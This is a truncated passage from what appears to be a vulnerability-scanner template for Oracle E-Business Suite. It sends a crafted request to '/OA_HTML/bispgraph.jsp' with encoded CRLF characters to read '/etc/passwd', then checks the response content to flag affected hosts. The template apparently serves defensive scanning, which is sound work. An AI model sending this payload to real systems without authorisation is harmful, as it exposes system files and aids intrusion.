  redirect: false
  url: '{{.root}}/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/'
- detections:
  - StatusCode() == 200 && (StringSearch("response", "[extensions]") || StringSearch("response",
